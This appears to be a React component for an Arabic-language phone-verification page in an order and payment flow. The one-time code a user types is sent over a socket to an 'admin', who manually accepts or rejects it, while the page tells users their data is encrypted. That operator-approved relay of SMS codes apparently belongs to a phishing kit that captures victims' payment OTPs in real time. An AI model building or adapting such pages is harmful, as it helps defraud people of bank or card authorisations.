import { useCallback, useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { useDispatch, useSelector } from "react-redux";
import { RootState } from "../redux/store";
import {
  setOtpDigit,
  decrementTimer,
  resetTimer,
  setError,
  clearError,
} from "../redux/slices/otpVerificationSlice";
import { useSocket } from "../contexts/SocketProvider";

export const OtpVerification = () => {
  const navigate = useNavigate();
  const dispatch = useDispatch();
  const socket = useSocket();
  const [, setIsPhoneVerified] = useState(false); // the paymnet process completed or no
  const { otp, timer, error, phoneNumber } = useSelector(
    (state: RootState) => state.otpVerification
  );

  useEffect(() => {
    const interval = setInterval(() => {
      dispatch(decrementTimer());
    }, 1000);

    return () => clearInterval(interval);
  }, [dispatch]);

  useEffect(() => {
    if (!socket) return;

    function adminVerifiedPhoneHandler(data) {
      alert(data.message + " + The Process Completed  ✔");
      setIsPhoneVerified(true);
      localStorage.clear();
      navigate("/");
    }
    socket.on("admin-verified-phone", adminVerifiedPhoneHandler);

    function rejectedHandler(data) {
      alert(data.message + "Send The Code Again ✔");
    }
    socket.on("rejected", rejectedHandler);

    return () => {
      socket.on("admin-verified-phone", adminVerifiedPhoneHandler);
      socket.on("rejected", rejectedHandler);
    };
  }, [socket]);

  const formatTime = useCallback((seconds: number) => {
    const minutes = Math.floor(seconds / 60);
    const remainingSeconds = seconds % 60;
    return `${String(minutes).padStart(2, "0")}:${String(
      remainingSeconds
    ).padStart(2, "0")}`;
  }, []);

  const handleOtpChange = useCallback(
    (e: React.ChangeEvent<HTMLInputElement>) => {
      const value = e.target.value.replace(/\D/g, "").slice(0, 6);
      const digits = value.split("");
      while (digits.length < 6) digits.push("");
      digits.forEach((digit, index) => {
        dispatch(setOtpDigit({ index, value: digit }));
      });
      dispatch(clearError());
    },
    [dispatch]
  );

  const handleResendCode = useCallback(() => {
    dispatch(resetTimer());
    // Add API call for resending code here
  }, [dispatch]);

  const handleSubmit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();
      const otpValue = otp.join("");

      if (otpValue.length !== 4 && otpValue.length !== 6) {
        dispatch(setError("يرجى إدخال 4 أو 6 أرقام للتحقق"));
        return;
      }

      try {
        const order_id = JSON.parse(localStorage.getItem("order_id"));
        socket.emit("phone-verification", {
          code: otpValue,
          orderId: order_id,
        });
      } catch {
        dispatch(setError("رمز التحقق غير صحيح"));
      }
    },
    [dispatch, navigate, otp]
  );

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 py-12 md:py-20 px-4">
      <div className="max-w-2xl mx-auto">
        <div className="bg-white rounded-2xl shadow-xl p-6 md:p-8 backdrop-blur-lg bg-opacity-90 transform transition-all duration-300 hover:shadow-2xl">
          <div className="text-center space-y-4 mb-8">
            <h1 className="text-2xl md:text-3xl font-bold text-[#146394]">
              استكمال بيانات الطلب
            </h1>
            <h2 className="text-xl font-semibold text-[#146394]">
              تحقيق رقم الجوال
            </h2>
            <div className="space-y-2">
              <p className="text-gray-600">
                تم ارسال رسالة نصية إلى جوالك لربط الوثيقة على رقم الهاتف الخاص
                بك!
              </p>
              <p className="text-gray-600">
                يرجى ادخال رمز التحقق المرسل إلى جوالك رقم
              </p>
              <p className="font-bold text-lg text-[#146394] dir-ltr">
                {phoneNumber}
              </p>
            </div>
          </div>

          <form onSubmit={handleSubmit} className="space-y-8">
            <div>
              <label
                htmlFor="otp-input"
                className="block text-right mb-4 text-[#146394] font-medium"
              >
                رمز التحقق <span className="text-red-500">*</span>
              </label>
              <div className="flex justify-center">
                <input
                  id="otp-input"
                  type="text"
                  inputMode="numeric"
                  maxLength={6}
                  value={otp.join("")}
                  onChange={handleOtpChange}
                  className="w-48 h-14 text-center text-2xl font-bold border-2 rounded-lg focus:border-[#146394] focus:ring-2 focus:ring-blue-200 outline-none transition-all bg-white"
                  placeholder="######"
                  aria-label="Enter verification code"
                />
              </div>
              {error && (
                <p
                  role="alert"
                  className="text-red-500 text-sm mt-2 text-center animate-shake"
                >
                  {error}
                </p>
              )}
            </div>

            <div className="text-center text-[#146394] bg-blue-50 p-4 rounded-xl">
              <p>سيتم إرسال رسالة كود التحقق في خلال</p>
              <p className="font-bold text-lg mt-1">
                {formatTime(timer)} دقيقة
              </p>
            </div>

            <button
              type="submit"
              className="w-full bg-[#146394] text-white py-4 rounded-lg font-semibold transition-all duration-300 hover:bg-[#0f4c70] transform hover:scale-[0.99] active:scale-[0.97] text-lg disabled:opacity-50 disabled:cursor-not-allowed"
              disabled={
                !(
                  otp.filter((digit) => digit).length === 4 ||
                  otp.filter((digit) => digit).length === 6
                )
              }
            >
              متابعة
            </button>

            {timer === 0 && (
              <button
                type="button"
                onClick={handleResendCode}
                className="w-full text-[#146394] py-2 font-semibold hover:bg-blue-50 rounded-lg transition-all duration-300"
              >
                إعادة إرسال الرمز
              </button>
            )}
          </form>

          <div className="mt-8 text-center">
            <div className="flex items-center justify-center gap-2 text-[#146394] bg-blue-50 p-4 rounded-lg transition-all duration-300 hover:bg-blue-100">
              <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
                <path
                  fillRule="evenodd"
                  d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z"
                  clipRule="evenodd"
                />
              </svg>
              <p className="text-sm">
                نحن نستخدم تقنيات تشفير متقدمة لحماية بياناتك
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default OtpVerification;
